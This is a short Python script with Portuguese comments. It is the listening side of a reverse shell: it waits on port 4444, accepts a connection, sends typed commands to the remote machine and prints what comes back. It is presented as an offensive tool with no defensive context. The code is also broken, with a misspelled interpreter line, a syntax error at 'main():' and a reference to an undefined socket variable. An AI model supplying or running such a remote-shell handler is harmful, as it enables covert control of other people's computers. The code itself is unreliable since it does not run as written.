#!/usr/bin/env pytyhon3
# -*- coding: utf-8 -*-

import socket
import sys
import time
from colorama import *

def mainShell():
    # criando socket e recebendo conexao
    port = 4444
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s.bind(("",port))
    s.listen(1)

    print(f"{Fore.GREEN}[+]Esperando conexao na porta: {port}")

    conn,addr = s.accept()

    # enviando comandos

    while True:
        try:
            shell = input(f"\n{addr[0]}@Shell~>")
            if shell == 'exit':
                sys.exit()
                conn.close()
                break

            if len(str.encode(shell)) > 0:
                conn.send(str.encode(shell))
                c_responde = str(conn.recv(1024), 'utf-8', errors="ignore")
                print(c_responde, end="")
        
        except KeyboardInterrupt:
            sys.exit()

        except Exception as e:
            print(f"{Fore.RED}[!]Ocorreu algum erro: {e}")
            print(f"{Fore.GREEN}[+]Tentando novamente...")

            s.close()
            mainShell()


def main():
    init(autoreset=True)
    mainShell()

try:
    main():

except Exception as e:
    print(f"{Fore.RED}[!]Ocorreu algum erro: {e}")
    print(f"{Fore.GREEN}[+]Tentando novamente...")

    s.close()
    main()
